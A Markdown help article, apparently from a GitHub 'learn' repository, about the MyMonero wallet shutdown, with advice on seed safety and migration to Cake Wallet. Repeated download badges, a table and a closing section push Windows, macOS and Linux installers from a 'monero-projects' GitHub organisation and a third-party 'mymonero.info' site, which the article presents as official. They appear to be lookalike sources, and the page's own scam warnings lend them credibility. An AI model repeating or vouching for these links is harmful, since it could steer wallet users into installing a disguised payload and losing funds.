<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Shutdown Facts: What Is and Is Not Known</h1>
<p align="center">Separate confirmed product status from uncertain dates and details, and plan next steps without panic.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The MyMonero desktop wallet’s final release is v1.3.3, and the old app still opens wallets and sends XMR. It is no longer maintained, while MyMonero hosted servers and web-wallet login stopped; a shutdown date and some technical details are unconfirmed here.


The MyMonero.info site covers this in its [MyMonero shutdown guide](https://mymonero.info/mymonero-shutdown). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.

## You'll see this if
- You cannot log into MyMonero hosted web-wallet access.
- You can open the desktop app but want to know whether it is still supported.
- You have heard a specific shutdown date or a claim about server data.
- You are deciding whether to keep the desktop app or restore your seed elsewhere.
- Someone is using shutdown claims to pressure you to share a seed or send funds.

## Why it happens
“Shutdown” can refer to more than one part of a product. The confirmed status is that MyMonero hosted servers and web-wallet login stopped. Separately, a final desktop release, v1.3.3, is available on the monero-projects GitHub release page. The old desktop app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. Hosted access and the desktop app should not be treated as the same thing.

The available desktop packages are Windows .exe, macOS .dmg, and Linux .zip. A published installer does not mean that hosted login works or that maintenance continues. Check the [final MyMonero desktop release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) for the release details. More general project context is in the [MyMonero desktop wallet repository](https://github.com/monero-projects/mymonero-desktop-wallet).

Some questions cannot be answered as confirmed facts here. A shutdown date is unconfirmed. Data-folder paths, whether servers saw view keys, and a password-reset method are also unconfirmed. Do not treat guesses or copied claims as verified. In particular, the fact that hosted access stopped does not by itself tell you what data a service saw or retained. See [MyMonero privacy keys explained](./mymonero-private-view-spend-keys.md) for key concepts, not a claim about server history.

You have two stated options: continue using MyMonero desktop with its maintenance limitations, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. A migration decision should be based on your circumstances and secure backup, not an urgent message. Compare [MyMonero and Cake Wallet](./mymonero-vs-cake-wallet-comparison.md).

---

## Fix
1. **Separate known status from rumor.** Treat stopped hosted login, final desktop release v1.3.3, and lack of maintenance as confirmed facts. Do not repeat a date, data-handling claim, or technical detail as fact unless it is independently confirmed from a suitable source.
2. **Check which access route you used.** If you are trying the hosted web login, understand that it stopped. If the desktop app opens, it is a distinct local application; the old app still opens wallets and sends XMR, but receives no new features or security updates.
3. **Keep access information secure.** Locate your own seed backup without sharing or photographing it for a stranger. MyMonero seeds may have 13 MyMonero-specific legacy words or 25 standard Monero words. See [MyMonero seed 13 vs 25 words](./mymonero-seed-13-vs-25-words.md).
4. **Choose whether to continue or restore.** One option is continuing with desktop and accepting that it is no longer maintained. Another is restoring the seed in Cake Wallet. Review the migration checklist before starting; do not assume that shutting down hosted login requires an immediate sweep.
5. **Use the correct package source if needed.** Get the final desktop build from the release link above. Compare its SHA-256 against the release-page value using `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux. Do not use an unmatched or unfamiliar installer.
6. **Plan any restoration scan.** Restore height is the block height where a wallet begins scanning. An earlier height is safer when unsure, but scanning takes longer. Read restore height explained before selecting a value.
7. **Avoid rushed transfers.** Sweeping means sending all funds to a new wallet; it is not the same as restoring access. Understand the steps and recipient address before sending anything. See sweeping funds to a new wallet.

> [!TIP]
> Make a private checklist of what you know—desktop app opens or not, hosted login status, seed format, and desired next step. Keep seed words out of the checklist.

---

## If that did not work
If the desktop app will not open, use MyMonero app not opening or the startup crash guide. A failure to log into hosted access is not fixed by repeatedly trying to restore a password; the password-reset method is not confirmed here. Do not enter your seed into a page claiming to reactivate an account.

If you have a 13-word seed, it is MyMonero-specific and legacy; if you have a 25-word seed, it is standard Monero. Follow the appropriate 13-word restore instructions or 25-word migration guidance. Do not try to convert formats by guessing. Offline recovery of a missing seed word is not confirmed. Nobody legitimate asks for your seed.

If a wallet restore asks about import fees, the historical information is limited: MyMonero hosted servers historically charged a one-time fee to import a wallet created elsewhere. No current fee is stated here. See MyMonero import fee explained. Avoid paying an unfamiliar person or address based on an unsolicited message.

> [!WARNING]
> Shutdown-related phishing often relies on uncertainty. Do not disclose seed words, private keys, or wallet backups, and do not send XMR to “migrate,” “unlock,” or “protect” an account at someone else’s direction.

---

## Prevention
Keep a secure offline seed backup and know its word format. Never share it with support, a migration helper, or someone claiming to represent a project. A seed can provide access to funds. See how to back up a MyMonero seed safely.

Use the official GitHub release for desktop installers and verify SHA-256 against its published value. Be cautious of fake downloads and urgent support messages. For the broader picture, see is MyMonero safe? and MyMonero migration scams.

Keep confirmed facts separate from unanswered questions, especially shutdown date, data paths, and server visibility of view keys. Do not infer private-data handling from product status alone. Revisit the decision to keep using an unmaintained desktop app or restore in Cake Wallet on your own schedule, with a verified backup and a clear understanding of restore height.

## FAQ
<details><summary>When exactly did MyMonero shut down?</summary>

A shutdown date is unconfirmed in this guidance. The confirmed fact is that hosted servers and web-wallet login stopped.

</details>

<details><summary>Can the desktop wallet still be used?</summary>

The old desktop app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates.

</details>

<details><summary>What happened to view keys on hosted servers?</summary>

Whether servers saw view keys is unconfirmed here. Do not treat speculation as established fact.

</details>

<details><summary>Do I need to sweep funds immediately?</summary>

No urgent sweep is stated. Sweeping sends all funds to a new wallet and is distinct from restoring your seed. Plan carefully and keep your seed private.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Is MyMonero Safe? Practical Considerations](./is-mymonero-safe.md) | Understand the desktop app’s maintenance status, protect your seed, and assess choices without absolute promises. |
| [MyMonero Migration Scams: Warning Signs and Safer Choices](./mymonero-migration-scams.md) | Spot pressure tactics, protect recovery words, and plan any wallet transition at your own pace. |
| [MyMonero Fake Download Warning: Verify Before Installing](./mymonero-fake-download-warning.md) | Find the final desktop packages safely, check file integrity, and avoid lookalike installers. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
